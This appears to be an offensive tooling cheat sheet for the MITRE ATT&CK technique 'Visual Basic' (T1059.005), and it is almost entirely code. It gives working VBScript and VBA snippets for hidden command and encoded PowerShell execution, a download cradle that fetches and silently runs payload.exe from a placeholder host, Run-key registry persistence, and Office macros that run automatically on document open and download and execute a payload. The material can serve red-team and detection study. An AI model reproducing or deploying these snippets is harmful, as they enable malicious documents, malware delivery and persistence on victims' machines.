# T1059.005 - Visual Basic (tooling)

## VBScript execution hosts

```batch
:: Console-based execution (no GUI)
cscript.exe script.vbs

:: GUI-based execution (popups, hidden windows)
wscript.exe script.vbs

:: Encoded VBScript (VBE)
cscript.exe encoded.vbe
```

## VBScript command execution

```vb
' Execute command silently (0 = hide window)
CreateObject("WScript.Shell").Run "cmd /c whoami", 0

' Execute command and wait for completion
CreateObject("WScript.Shell").Run "cmd /c whoami", 1, True

' Execute PowerShell from VBScript
CreateObject("WScript.Shell").Run "powershell -nop -w hidden -enc <base64>", 0
```

## VBScript download cradle

```vb
Dim xh, url, body
url = "http://<host>/payload.exe"
Set xh = CreateObject("MSXML2.XMLHTTP")
xh.Open "GET", url, False
xh.Send
body = xh.ResponseBody

' Write to file
Dim fs
Set fs = CreateObject("ADODB.Stream")
fs.Type = 1
fs.Open
fs.Write body
fs.SaveToFile "C:\temp\payload.exe", 2
fs.Close

' Execute downloaded payload
CreateObject("WScript.Shell").Run "C:\temp\payload.exe", 0
```

## VBScript registry persistence

```vb
CreateObject("WScript.Shell").RegWrite _
  "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Malicious", _
  "C:\malicious.vbs", "REG_SZ"
```

## VBA macro (Office document)

```vb
' Auto-execute on document open
Private Sub Document_Open()
    ' PowerShell via Shell() function
    Shell "powershell -nop -w hidden -enc <base64>", vbHide

    ' Via WScript.Shell COM object
    CreateObject("WScript.Shell").Run _
      "powershell -nop -w hidden -enc <base64>", 0
End Sub

' Excel variant
Private Sub Workbook_Open()
    Shell "powershell -nop -w hidden -enc <base64>", vbHide
End Sub
```

## VBA download and execute

```vb
Private Sub Document_Open()
    Dim xh As Object, fs As Object
    Dim url As String, tmp As String

    url = "http://<host>/payload.exe"
    tmp = Environ("TMP") & "\payload.exe"

    Set xh = CreateObject("MSXML2.XMLHTTP")
    xh.Open "GET", url, False
    xh.Send

    Set fs = CreateObject("ADODB.Stream")
    fs.Type = 1
    fs.Open
    fs.Write xh.ResponseBody
    fs.SaveToFile tmp, 2
    fs.Close

    Shell tmp, vbHide
End Sub
```
